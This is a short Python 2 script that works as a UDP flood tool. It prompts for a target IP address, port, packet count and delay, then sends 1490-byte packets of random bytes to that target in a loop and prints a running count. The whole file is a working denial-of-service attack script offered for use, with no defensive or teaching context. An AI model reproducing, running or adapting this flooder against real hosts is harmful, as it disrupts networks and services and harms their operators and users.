import os
import time
import random
import socket
import sys

sent = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = raw_input("~ IP: ")
port = input("~ Port: ")
packetsToSend = int(input('~ Packets: '))
timing = int(input('~ Timing between requests (0 for none): '))

while sent < packetsToSend:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print "Sent %s packets to ip: %s in port:%s"%(sent,ip,port)
    time.sleep(timing)
